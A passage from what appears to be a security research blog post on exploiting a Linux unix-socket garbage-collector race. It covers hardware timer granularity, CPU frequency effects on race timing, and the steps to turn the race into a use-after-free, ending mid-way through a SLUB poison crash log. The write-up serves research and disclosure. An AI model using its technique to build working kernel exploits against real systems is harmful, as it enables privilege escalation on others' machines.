isn&amp;#39;t a discrete event, but something that introduces a random amount of timing delay within some window. So I became suspicious of the hardware timer. The kernel is using &lt;/span&gt;&lt;span class="c4"&gt;MSR_IA32_TSC_DEADLINE&lt;/span&gt;&lt;span&gt;, and the Intel SDM tells us that that thing is programmed with a TSC value, which makes it look as if the timer has very high granularity. But &lt;/span&gt;&lt;span class="c4"&gt;MSR_IA32_TSC_DEADLINE&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a newer mode of the LAPIC timer, and the older LAPIC timer modes were instead programmed in units of the APIC timer frequency. According to the &lt;/span&gt;&lt;span class="c11"&gt;&lt;a class="c121" href="https://www.intel.com/content/dam/www/public/us/en/documents/manuals/64-ia-32-architectures-software-developer-vol-3a-part-1-manual.pdf#page=378"&gt;Intel SDM, Volume 3A&lt;/a&gt;&lt;/span&gt;&lt;span&gt;, section 10.5.4 &amp;quot;APIC Timer&amp;quot;, that is &amp;quot;&lt;/span&gt;&lt;span class="c16"&gt;the processor&amp;rsquo;s bus clock or core crystal clock frequency (when TSC/core crystal clock ratio is enumerated in CPUID leaf 0x15) divided by the value specified in the divide configuration register&lt;/span&gt;&lt;span&gt;&amp;quot;. This frequency is significantly lower than the TSC frequency. So perhaps &lt;/span&gt;&lt;span class="c4"&gt;MSR_IA32_TSC_DEADLINE&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;is actually just a front-end to the same old APIC timer?&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;I tried to measure the difference between the programmed TSC value and when execution was actually interrupted (not when the interrupt handler starts running, but when the old execution context is interrupted - you can measure that if the interrupted execution context is just running RDTSC in a loop); that looks as follows:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiW-q2Y4qk2XxZFtmNh0dVgZBg2qi_J6GIBXjssAs3Kek3XT8Mzlr76jzRv0SVspubXHHgEg1tENINosS43VBcajf3EhRn4Pwn4WnqjKgslRtQkEDzCotXBoL4iOIdpJU3vlI4e11jlso63hx61a6tDRXTY5ViS5izijo5wpJfh5Ht_L1cZxUeisSfbRA/s756/image11.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEiW-q2Y4qk2XxZFtmNh0dVgZBg2qi_J6GIBXjssAs3Kek3XT8Mzlr76jzRv0SVspubXHHgEg1tENINosS43VBcajf3EhRn4Pwn4WnqjKgslRtQkEDzCotXBoL4iOIdpJU3vlI4e11jlso63hx61a6tDRXTY5ViS5izijo5wpJfh5Ht_L1cZxUeisSfbRA/s600/image11.png" border="0" alt="A graph showing noise. Delays from deadline TSC to last successful TSC read before interrupt look essentially random, in the range from around -130 to around 10." style="max-height: 750; max-width: 600;"title="A graph showing noise. Delays from deadline TSC to last successful TSC read before interrupt look essentially random, in the range from around -130 to around 10." /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;As you can see, the expiry of the hardware timer indeed adds a bunch of noise. The size of the timing difference is also very close to the crystal clock frequency - the TSC/core crystal clock ratio on this machine is 117. So I tried plotting the &lt;/span&gt;&lt;span class="c6"&gt;absolute&lt;/span&gt;&lt;span&gt;&amp;nbsp;TSC values at which execution was interrupted, &lt;/span&gt;&lt;span class="c6"&gt;modulo the TSC / core crystal clock ratio&lt;/span&gt;&lt;span class="c1"&gt;, and got this:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjnhvIj_v78i3_Vk4BRrZSOL2rktWnNEk3HNyageLBS1YnGQt7PCGWA5EmZMF1xzo_XlSTi1z4Rqyi6ltOkOCEE17MEltCI15H4QlomxfCvWuIO0z_aKdJct-3M9PfF2RXWq-JdMTjnC1qouedbaJ8tV4PIUbpItClOwUC_nPrJV9QoQsNngpXzMb6xeA/s543/image9.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjnhvIj_v78i3_Vk4BRrZSOL2rktWnNEk3HNyageLBS1YnGQt7PCGWA5EmZMF1xzo_XlSTi1z4Rqyi6ltOkOCEE17MEltCI15H4QlomxfCvWuIO0z_aKdJct-3M9PfF2RXWq-JdMTjnC1qouedbaJ8tV4PIUbpItClOwUC_nPrJV9QoQsNngpXzMb6xeA/s543/image9.png" border="0" alt="A graph showing a clear grouping around 0, roughly in the range -20 to 10, with some noise scattered over the rest of the graph." style="max-height: 750; max-width: 600;"title="A graph showing a clear grouping around 0, roughly in the range -20 to 10, with some noise scattered over the rest of the graph." /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;This confirms that &lt;/span&gt;&lt;span class="c4"&gt;MSR_IA32_TSC_DEADLINE&lt;/span&gt;&lt;span&gt;&amp;nbsp;is (apparently) an interface that &lt;/span&gt;&lt;span class="c6"&gt;internally converts the specified TSC value into less granular bus clock / core crystal clock time&lt;/span&gt;&lt;span class="c1"&gt;, at least on some Intel CPUs.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;But there&amp;#39;s still something really weird here: The TSC values at which execution seems to be interrupted were at &lt;/span&gt;&lt;span class="c6"&gt;negative&lt;/span&gt;&lt;span&gt;&amp;nbsp;offsets relative to the programmed expiry time, as if the timeouts were rounded &lt;/span&gt;&lt;span class="c6"&gt;down&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;to the less granular clock, or something along those lines. To get a better idea of how timer interrupts work, I measured on yet another system (an old Haswell CPU) with a patched kernel when execution is interrupted and when the interrupt handler starts executing relative to the programmed expiry time (and also plotted the difference between the two):&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj5P8-0GRdUXYX5Xyx-xoQbDZhsXDHuWWZZZoQWRHV-wPY9U7CuelBHQSODbeqrBGbGhuSDRVyKmiFmG1PiXxQHtNDKZfEwKUcmE5cw-c-3A-3wzfJrZedEfk3zyaTXv8_A4UmxMejdeWNhZ2l8AuoLhcDveiOjzsl9Lmpw4g6eS2ccT3koir8Qy0SMGg/s928/image17.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEj5P8-0GRdUXYX5Xyx-xoQbDZhsXDHuWWZZZoQWRHV-wPY9U7CuelBHQSODbeqrBGbGhuSDRVyKmiFmG1PiXxQHtNDKZfEwKUcmE5cw-c-3A-3wzfJrZedEfk3zyaTXv8_A4UmxMejdeWNhZ2l8AuoLhcDveiOjzsl9Lmpw4g6eS2ccT3koir8Qy0SMGg/s600/image17.png" border="0" alt="A graph showing that the skid from programmed interrupt time to execution interruption is around -100 to -30 cycles, the skid to interrupt entry is around 360 to 420 cycles, and the time from execution interruption to interrupt entry has much less timing variance and is at around 440 cycles." style="max-height: 750; max-width: 600;"title="A graph showing that the skid from programmed interrupt time to execution interruption is around -100 to -30 cycles, the skid to interrupt entry is around 360 to 420 cycles, and the time from execution interruption to interrupt entry has much less timing variance and is at around 440 cycles." /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;So it looks like the CPU starts handling timer interrupts a little bit before the programmed expiry time, but interrupt handler entry takes so long (~450 TSC clock cycles?) that by the time the CPU starts executing the interrupt handler, the timer expiry time has long passed.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Anyway, the important bit for us is that when the CPU interrupts execution due to timer expiry, it&amp;#39;s always at a LAPIC timer edge; and LAPIC timer edges happen when the TSC value is a multiple of the TSC/LAPIC clock ratio. An exploit that doesn&amp;#39;t take that into account and wrongly assumes that &lt;/span&gt;&lt;span class="c4"&gt;MSR_IA32_TSC_DEADLINE&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;has TSC granularity will have its timing smeared by one LAPIC clock period, which can be something like 40ns.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;The ~30% accuracy we could achieve with the existing PoC with the right timing is already not terrible; but if we control for the timer&amp;#39;s weirdness, can we do better?&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;The problem is that we are effectively launching the race with two timers that behave differently: One timer based on calling &lt;/span&gt;&lt;span class="c4"&gt;clock_gettime()&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;in a loop (which uses the high-resolution TSC to compute a time), the other a hardware timer based on the lower-resolution LAPIC clock. I see two options to fix this:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt;&lt;ol class="c20 lst-kix_94mysn7p9quk-0 start" start="1"&gt;&lt;li style="margin-left: 46pt;" class="c3 c14 li-bullet-0"&gt;&lt;span class="c1"&gt;Try to ensure that the second timer is set at the start of a LAPIC clock period - that way, the second timer should hopefully behave exactly like the first (or have an additional fixed offset, but we can compensate for that).&lt;/span&gt;&lt;/li&gt;&lt;li style="margin-left: 46pt;" class="c3 c14 li-bullet-0"&gt;&lt;span class="c1"&gt;Shift the first timer&amp;#39;s expiry time down according to the distance from the second timer to the previous LAPIC clock period.&lt;/span&gt;&lt;/li&gt;&lt;/ol&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;(One annoyance with this is that while we can grab information on how wall/monotonic time is calculated from TSC from the vvar mapping used by the vDSO, the clock is subject to minuscule additional corrections at every clock tick, which occur every 4ms on standard distro kernels (with &lt;/span&gt;&lt;span class="c4"&gt;CONFIG_HZ=250&lt;/span&gt;&lt;span class="c1"&gt;) as long as any core is running.)&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;I tried to see whether the timing graph would look nicer if I accounted for this LAPIC clock rounding and also used a custom kernel to cheat and control for possible skid introduced by the absolute-to-relative-and-back conversion of the expiry time (see further up), but that still didn&amp;#39;t help all that much.&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c15" id="h.na1zwzioj0fl"&gt;&lt;span class="c8"&gt;(No) surprise: clock speed matters&lt;/span&gt;&lt;/h1&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;Something I should&amp;#39;ve thought about way earlier is that of course, clock speed matters. On newer Intel CPUs with P-states, the CPU is normally in control of its own frequency, and dynamically adjusts it as it sees fit; the OS just provides some hints.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Linux has an interface that claims to tell you the &amp;quot;current frequency&amp;quot; of each CPU core in &lt;/span&gt;&lt;span class="c4"&gt;/sys/devices/system/cpu/cpufreq/policy&amp;lt;n&amp;gt;/scaling_cur_freq&lt;/span&gt;&lt;span class="c1"&gt;, but when I tried using that, I got a different &amp;quot;frequency&amp;quot; every time I read that file, which seemed suspicious.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;Looking at the implementation, it turns out that the value shown there is calculated in &lt;/span&gt;&lt;span class="c4"&gt;arch_freq_get_on_cpu()&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span&gt;its&lt;/span&gt;&lt;span&gt;&amp;nbsp;&lt;/span&gt;&lt;span&gt;callees&lt;/span&gt;&lt;span&gt;&amp;nbsp;- the value is calculated on demand when the file is read, with results cached for around 10 milliseconds. The value is determined as the ratio between the deltas of &lt;/span&gt;&lt;span class="c4"&gt;MSR_IA32_APERF&lt;/span&gt;&lt;span&gt;&amp;nbsp;and &lt;/span&gt;&lt;span class="c4"&gt;MSR_IA32_MPERF&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;between the last read and the current one. So if you have some tool that is polling these values every few seconds and wants to show average clock frequency over that time, it&amp;#39;s probably a good way of doing things; but if you actually want the current clock frequency, it&amp;#39;s not a good fit.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;I hacked a helper into my kernel that samples both MSRs twice in quick succession, and that gives much cleaner results. When I measure the clock speeds and timing offsets at which the race succeeds, the result looks like this (showing just two clock speeds; the Y axis is the number of race successes at the clock offset specified on the X axis and the frequency scaling specified by the color):&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjMIfuP5LR9MCV5pN4dQfl-VCNLcYqE6Y0Doo0JmCsmr5QiE9NAxlhBUk2LcXsfb0HumRMsyzic3Fjtbge_JtCpgkyj4qpSSkbh6-hfVhQr3EmPwpvoWxQarBApQDXiwuCLdVEUxkngjNkh_GvO2-JB9gg53-j5oX8lXr5Ih-3Z7rz34zgB7kK2MzOnBw/s666/image1%20%281%29.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjMIfuP5LR9MCV5pN4dQfl-VCNLcYqE6Y0Doo0JmCsmr5QiE9NAxlhBUk2LcXsfb0HumRMsyzic3Fjtbge_JtCpgkyj4qpSSkbh6-hfVhQr3EmPwpvoWxQarBApQDXiwuCLdVEUxkngjNkh_GvO2-JB9gg53-j5oX8lXr5Ih-3Z7rz34zgB7kK2MzOnBw/s600/image1%20%281%29.png" border="0" alt="A graph showing that the timing of successful race attempts depends on the CPU&amp;#39;s performance setting - at 11/28 performance, most successful race attempts occur around clock offset -1200 (in TSC units), while at 14/28 performance, most successful race attempts occur around clock offset -1000." style="max-height: 750; max-width: 600;"title="A graph showing that the timing of successful race attempts depends on the CPU&amp;#39;s performance setting - at 11/28 performance, most successful race attempts occur around clock offset -1200 (in TSC units), while at 14/28 performance, most successful race attempts occur around clock offset -1000." /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c1"&gt;So clearly, dynamic frequency scaling has a huge impact on the timing of the race - I guess that&amp;#39;s to be expected, really.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;But even accounting for all this, the graph still looks kind of smooth, so clearly there is still something more that I&amp;#39;m missing - oh well. I decided to stop experimenting with the race&amp;#39;s timing at this point, since I didn&amp;#39;t want to sink too much time into it. (Or perhaps I actually just stopped because I got distracted by newer and shinier things?)&lt;/span&gt;&lt;/p&gt;&lt;h1 class="c15" id="h.ktiklcw2yj2x"&gt;&lt;span&gt;Causing a UAF&lt;/span&gt;&lt;/h1&gt; &lt;p class="c3"&gt;&lt;span&gt;Anyway, I could probably spend much more time trying to investigate the timing variations (and probably mostly bang my head against a wall because details of execution timing are really difficult to understand in detail, and to understand it completely, it might be necessary to use something like &lt;/span&gt;&lt;span class="c11"&gt;&lt;a class="c121" href="https://gamozolabs.github.io/metrology/2019/08/19/sushi_roll.html"&gt;Gamozo Labs&amp;#39; &amp;quot;Sushi Roll&amp;quot;&lt;/a&gt;&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;and then go through every single instruction in detail and compare the observations to the internal architecture of the CPU). Let&amp;#39;s not do that, and get back to how to actually exploit this bug!&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;To turn this bug into memory corruption, we have to abuse that the &lt;/span&gt;&lt;span class="c4"&gt;recvmsg()&lt;/span&gt;&lt;span&gt;&amp;nbsp;path assumes that SKBs on the receive queue are protected from deletion by the socket mutex while the GC actually deletes SKBs from the receive queue without touching the socket mutex. For that purpose, while the unix GC is running, we have to start a &lt;/span&gt;&lt;span class="c4"&gt;recvmsg()&lt;/span&gt;&lt;span&gt;&amp;nbsp;call that looks up the victim SKB, block until the unix GC has freed the SKB, and then let &lt;/span&gt;&lt;span class="c4"&gt;recvmsg()&lt;/span&gt;&lt;span&gt;&amp;nbsp;continue operating on the freed SKB. This is fairly straightforward - while it is a race, we can easily slow down &lt;/span&gt;&lt;span class="c4"&gt;unix_gc()&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;for multiple milliseconds by creating lots of sockets that are not directly referenced from the FD table and have many tiny SKBs queued up - here&amp;#39;s a graph showing the unix GC execution time on my laptop, depending on the number of queued SKBs that the GC has to scan through:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;&lt;a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi0LcZNwFYw4nd-9oLDSGMOfrBVQSmYhonQJ_dPBcls3arS_m0_sSkQ7W7t4uaTJlkBgUc8gKgZquaKqs5KBmO4KNRrp9O09nLg_8N3m0wTHbZ8uINXqQ2L36shkZweV2lhvMPHthSOlTrdeAt3qe-e3e-IcIIJ22jPoXUFSbUmleX7AvD2eIZJTqOP5Q/s833/image15.png" style="display: block; padding: 1em 0;text-align: center;"&gt;&lt;img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEi0LcZNwFYw4nd-9oLDSGMOfrBVQSmYhonQJ_dPBcls3arS_m0_sSkQ7W7t4uaTJlkBgUc8gKgZquaKqs5KBmO4KNRrp9O09nLg_8N3m0wTHbZ8uINXqQ2L36shkZweV2lhvMPHthSOlTrdeAt3qe-e3e-IcIIJ22jPoXUFSbUmleX7AvD2eIZJTqOP5Q/s600/image15.png" border="0" alt="A graph showing the time spent per GC run depending on the number of queued SKBs. The relationship is roughly linear." style="max-height: 750; max-width: 600;"title="A graph showing the time spent per GC run depending on the number of queued SKBs. The relationship is roughly linear." /&gt;&lt;/a&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;To turn this into a UAF, it&amp;#39;s also necessary to get past the following check near the end of &lt;/span&gt;&lt;span class="c4"&gt;unix_gc()&lt;/span&gt;&lt;span class="c1"&gt;:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;/* All candidates should have been detached by now. */&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c7 c4"&gt;&amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; BUG_ON(!list_empty(&amp;amp;gc_candidates));&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c4"&gt;gc_candidates&lt;/span&gt;&lt;span&gt;&amp;nbsp;is a list that previously contained all sockets that were deemed to be unreachable by the GC. Then, the GC attempted to free all those sockets by eliminating their mutual references. If we manage to keep a reference to one of the sockets that the GC thought was going away, the GC detects that with the &lt;/span&gt;&lt;span class="c4"&gt;BUG_ON()&lt;/span&gt;&lt;span class="c1"&gt;.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;But we don&amp;#39;t actually need the victim SKB to reference a socket that the GC thinks is going away; in &lt;/span&gt;&lt;span class="c4"&gt;scan_inflight()&lt;/span&gt;&lt;span&gt;, the GC targets any SKB with a socket that is marked &lt;/span&gt;&lt;span class="c4"&gt;UNIX_GC_CANDIDATE&lt;/span&gt;&lt;span&gt;, meaning it just had to be &lt;/span&gt;&lt;span class="c6"&gt;a candidate&lt;/span&gt;&lt;span&gt;&amp;nbsp;for being scanned by the GC. So by making the victim SKB hold a reference to a socket that is not directly referenced from a file descriptor table, but is indirectly referenced by a file descriptor table through another socket, we can ensure that the &lt;/span&gt;&lt;span class="c4"&gt;BUG_ON()&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;won&amp;#39;t trigger.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;I extended &lt;/span&gt;&lt;span class="c11"&gt;&lt;a class="c121" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2247#c6"&gt;my reproducer&lt;/a&gt;&lt;/span&gt;&lt;span&gt;&amp;nbsp;with this trick and some userfaultfd trickery to make &lt;/span&gt;&lt;span class="c4"&gt;recv()&lt;/span&gt;&lt;span&gt;&amp;nbsp;run with the right timing. Nowadays you don&amp;#39;t necessarily get full access to userfaultfd as a normal user, but since I&amp;#39;m just trying to show the concept, and there are alternatives to userfaultfd&lt;/span&gt;&lt;span&gt;&amp;nbsp;(using FUSE or just slow disk access&lt;/span&gt;&lt;span&gt;)&lt;/span&gt;&lt;span&gt;,&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;that&amp;#39;s good enough for this blogpost.&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span&gt;When a normal distro kernel is running normally, the UAF reproducer&amp;#39;s UAF accesses won&amp;#39;t actually be noticeable; but if you add the kernel command line flag &lt;/span&gt;&lt;span class="c4"&gt;slub_debug=FP&lt;/span&gt;&lt;span class="c1"&gt;&amp;nbsp;(to enable SLUB&amp;#39;s poisoning and sanity checks), the reproducer quickly crashes twice, first with a poison dereference and then a poison overwrite detection, showing that one byte of the poison was incremented:&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c1"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;general protection fault, probably for non-canonical address 0x6b6b6b6b6b6b6b6b: 0000 [#1] SMP NOPTI&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;CPU: 1 PID: 2655 Comm: hardirq_loop Not tainted 5.10.0-9-amd64 #1 Debian 5.10.70-1&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;[...]&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;RIP: 0010:unix_stream_read_generic+0x72b/0x870&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;Code: fe ff ff 31 ff e8 85 87 91 ff e9 a5 fe ff ff 45 01 77 44 8b 83 80 01 00 00 85 c0 0f 89 10 01 00 00 49 8b 47 38 48 85 c0 74 23 &amp;lt;0f&amp;gt; bf 00 66 85 c0 0f 85 20 01 00 00 4c 89 fe 48 8d 7c 24 58 44 89&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;RSP: 0018:ffffb789027f7cf0 EFLAGS: 00010202&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;RAX: 6b6b6b6b6b6b6b6b RBX: ffff982d1d897b40 RCX: 0000000000000000&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;RDX: 6a0fe1820359dce8 RSI: ffffffffa81f9ba0 RDI: 0000000000000246&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;RBP: ffff982d1d897ea8 R08: 0000000000000000 R09: 0000000000000000&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;R10: 0000000000000000 R11: ffff982d2645c900 R12: ffffb789027f7dd0&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;R13: ffff982d1d897c10 R14: 0000000000000001 R15: ffff982d3390e000&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;FS: &amp;nbsp;00007f547209d740(0000) GS:ffff98309fa40000(0000) knlGS:0000000000000000&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;CS: &amp;nbsp;0010 DS: 0000 ES: 0000 CR0: 0000000080050033&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;CR2: 00007f54722cd000 CR3: 00000001b61f4002 CR4: 0000000000770ee0&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;PKRU: 55555554&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;Call Trace:&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;[...]&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp;unix_stream_recvmsg+0x53/0x70&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;[...]&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp;__sys_recvfrom+0x166/0x180&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;[...]&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp;__x64_sys_recvfrom+0x25/0x30&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp;do_syscall_64+0x33/0x80&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;&amp;nbsp;entry_SYSCALL_64_after_hwframe+0x44/0xa9&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;[...]&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;---[ end trace 39a81eb3a52e239c ]---&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;=============================================================================&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;BUG skbuff_head_cache (Tainted: G &amp;nbsp; &amp;nbsp; &amp;nbsp;D &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp; &amp;nbsp;): Poison overwritten&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;-----------------------------------------------------------------------------&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;INFO: 0x00000000d7142451-0x00000000d7142451 @offset=68. First byte 0x6c instead of 0x6b&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;INFO: Slab 0x000000002f95c13c objects=32 used=32 fp=0x0000000000000000 flags=0x17ffffc0010200&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;INFO: Object 0x00000000ef9c59c8 @offset=0 fp=0x00000000100a3918&lt;/span&gt;&lt;/p&gt; &lt;p class="c0"&gt;&lt;span class="c2"&gt;&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;Object &amp;nbsp; 00000000ef9c59c8: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &amp;nbsp;kkkkkkkkkkkkkkkk&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;Object &amp;nbsp; 0000000097454be8: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b &amp;nbsp;kkkkkkkkkkkkkkkk&lt;/span&gt;&lt;/p&gt; &lt;p class="c3"&gt;&lt;span class="c2"&gt;Object &amp;nbsp; 0000000035f1d791: 6b 6b 6b 6b 6b 6b 6b 6b 6b 6b 